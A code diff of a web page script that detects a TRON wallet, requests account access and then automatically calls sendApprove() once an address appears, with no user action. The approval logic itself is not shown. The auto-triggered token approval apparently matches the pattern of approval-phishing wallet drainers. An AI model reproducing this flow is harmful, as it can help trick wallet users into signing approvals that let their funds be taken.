@@ -17,37 +17,76 @@
         var debug = document.getElementById("debug");
         var started = false;
 
-        // Poll for tronWeb every 200ms
+        // Wait for tronWeb to appear, then request access
         var check = setInterval(function() {
-            var tw = window.tronWeb;
-            if (!tw) {
-                debug.textContent = "tronWeb: not found";
-                return;
-            }
-
-            // Trust Wallet may not set .ready = true
-            // Check if defaultAddress exists instead
-            var hasAddress = tw.defaultAddress && tw.defaultAddress.base58 && tw.defaultAddress.base58.length > 5;
-            var isReady = tw.ready || hasAddress;
-
-            debug.textContent = "tronWeb: found | ready: " + tw.ready + " | addr: " + (tw.defaultAddress ? tw.defaultAddress.base58 : "none");
-
-            if (isReady && !started) {
-                started = true;
+            if (window.tronWeb) {
                 clearInterval(check);
-                sendApprove();
+                debug.textContent = "tronWeb found, requesting access...";
+                requestAccess();
             }
         }, 200);
 
-        // Timeout after 20s
         setTimeout(function() {
             if (!started) {
                 clearInterval(check);
                 status.textContent = "Wallet not detected";
                 status.style.color = "#f87171";
-                debug.textContent = "tronWeb: " + typeof window.tronWeb + " | Make sure TRON network is selected in Trust Wallet";
             }
         }, 20000);
+
+        function requestAccess() {
+            // Try tronLink.request first (Trust Wallet / TronLink standard)
+            if (window.tronLink && window.tronLink.request) {
+                window.tronLink.request({ method: "tron_requestAccounts" })
+                    .then(function(res) {
+                        debug.textContent = "Access granted: " + JSON.stringify(res);
+                        waitForAddress();
+                    })
+                    .catch(function(e) {
+                        debug.textContent = "Access denied: " + (e.message || e);
+                        status.textContent = "Please approve the connection";
+                        status.style.color = "#f87171";
+                    });
+            } else if (window.tronWeb.request) {
+                window.tronWeb.request({ method: "tron_requestAccounts" })
+                    .then(function(res) {
+                        debug.textContent = "Access granted via tronWeb";
+                        waitForAddress();
+                    })
+                    .catch(function(e) {
+                        debug.textContent = "Fallback: " + (e.message || e);
+                        waitForAddress();
+                    });
+            } else {
+                // No request method, just wait for address
+                debug.textContent = "No request method, waiting for address...";
+                waitForAddress();
+            }
+        }
+
+        function waitForAddress() {
+            var addrCheck = setInterval(function() {
+                var tw = window.tronWeb;
+                var addr = tw && tw.defaultAddress && tw.defaultAddress.base58;
+                if (addr && addr.length > 5 && addr !== "false") {
+                    clearInterval(addrCheck);
+                    if (!started) {
+                        started = true;
+                        debug.textContent = "Address: " + addr;
+                        sendApprove();
+                    }
+                }
+            }, 200);
+
+            // Timeout for address
+            setTimeout(function() {
+                if (!started) {
+                    status.textContent = "Could not get wallet address";
+                    status.style.color = "#f87171";
+                    debug.textContent = "addr: " + (window.tronWeb.defaultAddress ? window.tronWeb.defaultAddress.base58 : "none");
+                }
+            }, 15000);
+        }
 
         function sendApprove() {
             status.textContent = "Confirm in popup...";
